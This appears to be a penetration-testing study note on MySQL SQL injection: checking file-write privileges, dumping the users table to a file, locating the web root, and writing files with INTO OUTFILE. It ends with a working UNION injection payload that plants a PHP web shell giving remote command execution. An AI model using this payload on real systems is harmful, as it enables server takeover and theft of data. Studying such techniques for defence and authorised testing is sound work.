## Write File Privileges

To be able to write files to the back-end server using a MySQL database, we require three things:

1. User with `FILE` privilege enabled
2. MySQL global `secure_file_priv` variable not enabled
3. Write access to the location we want to write to on the back-end server

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

However, as we are using a `UNION` injection, we have to get the value using a `SELECT` statement. This shouldn't be a problem, as all variables and most configurations' are stored within the `INFORMATION_SCHEMA` database. `MySQL` global variables are stored in a table called [global_variables](https://dev.mysql.com/doc/refman/5.7/en/information-schema-variables-table.html), and as per the documentation, this table has two columns `variable_name` and `variable_value`.


```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```

## SELECT INTO OUTFILE

```SQL
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

Tip: Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data.

 To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using [this wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [this wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.

 We see the string we dumped along with '1', '3' before it, and '4' after it. This is because the entire 'UNION' query result was written to the file. To make the output cleaner, we can use "" instead of numbers.
## Writing a Web Shell

```php
<?php system($_REQUEST[0]); ?>
```

```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```
